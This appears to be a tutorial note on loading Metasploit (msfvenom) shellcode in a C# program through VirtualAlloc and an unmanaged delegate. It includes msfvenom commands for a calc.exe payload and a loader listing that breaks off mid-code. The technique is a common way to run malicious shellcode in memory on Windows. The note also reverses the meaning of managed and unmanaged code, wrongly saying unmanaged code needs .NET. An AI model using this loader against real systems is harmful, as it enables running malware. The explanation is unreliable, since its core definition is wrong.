description: Executing native windows payloads as unmanaged code.

## We write a program to execute native windows payloads as unmanaged code. (using metasploit)

- Msf payloads generated in 32/64bit assembly code is called unmanaged code, where you compile C# code into a dll or exe it is referred to as managed code. The difference betweeen the two is that unmanaged code requires mono/.NET to run whereas managed can be run directly.
- To execute unmanaged assembly code within a managed environment we'll use the .NET's `P/Invoke` to import and run the `VirtualAlloc()` function from `Kernel32.dll`. (lets us allocate memory) 
- We use the `DllImport` attribute to look for a lib at runtime.
- We generate our unmanaged code(pop calc.exe) using:
	> `msfvenom -p windows/x64/exec -f csharp CMD=calc.exe` - `x64`

	> `msfvenom -p windows/exec -f csharp CMD=calc.exe` - `x86`

### CODE:

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;


namespace msf_payload_using_Csharp
{
    public class MainClass
    {
        // Look for kerner32.dll at runtime
        [DllImport("Kernel32")]
        // Importing VirtualAlloc() from kernel32.dll
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);
        // Set this attr to call VirtualAlloc using stdCall to run unmanaged functions
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        // Declaring delegate with UnmanagedFunctionPointer attr 
        delegate void WindowsRun();

        public static void Main(string[] arg)
        {
            // Identifies platform property
            OperatingSystem os = Environment.OSVersion;
            // Verifying architecture by check IntPtr size (4 for 32bit, 8 for 64bit)
            bool x86 = (IntPtr.Size == 4);
            byte[] payload;

            if (os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
            {
                // shellcode gen for x86-x64 using msf
